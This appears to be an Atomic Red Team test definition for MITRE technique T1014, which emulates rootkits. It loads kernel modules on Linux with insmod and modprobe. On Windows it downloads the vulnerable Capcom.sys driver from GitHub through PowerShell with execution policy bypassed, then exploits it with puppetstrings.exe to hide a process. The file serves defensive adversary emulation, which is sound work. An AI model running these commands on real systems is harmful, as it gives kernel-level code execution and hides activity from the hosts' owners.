---
attack_technique: T1014
display_name: Loadable Kernel Module based Rootkit

atomic_tests:
- name: Loadable Kernel Module based Rootkit
  description: |
    Loadable Kernel Module based Rootkit

  supported_platforms:
    - linux

  input_arguments:
    rootkit_file:
      description: Path To Module
      type: String
      default: Module.ko

  executor:
    name: sh
    command: |
      sudo insmod #{rootkit_file}
- name: Loadable Kernel Module based Rootkit
  description: |
    Loadable Kernel Module based Rootkit

  supported_platforms:
    - linux

  input_arguments:
    rootkit_file:
      description: Path To Module
      type: String
      default: Module.ko

  executor:
    name: sh
    command: |
      sudo modprobe #{rootkit_file}

- name: Windows Signed Driver Rootkit Test
  description: |
    This test exploits a signed driver to execute code in Kernel.
    SHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7
    We leverage the work done here:
    https://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html
    The hash of our PoC Exploit is
    SHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441
    This will simulate hiding a process.
    It would be wise if you only run this in a test environment

  supported_platforms:
    - windows

  input_arguments:
    capcom_uri:
      description: Capcom.sys driver URI
      type: Url
      default: https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys
    driver_path:
      description: Path to the vulnerable driver
      type: Path
      default: '%TEMP%\driver.sys'
    puppetstrings_path:
      description: Path to puppetstrings.exe
      type: Path
      defualt: C:\AtomicRedTeam\atomics\T1014\bin\puppetstrings.exe
      
  executor:
    name: command_prompt
    command: |
      echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -Uri #{capcom_uri} -OutFile #{driver_path} | powershell -ExecutionPolicy Bypass -Command -
      #{puppetstrings_path} #{driver_path}
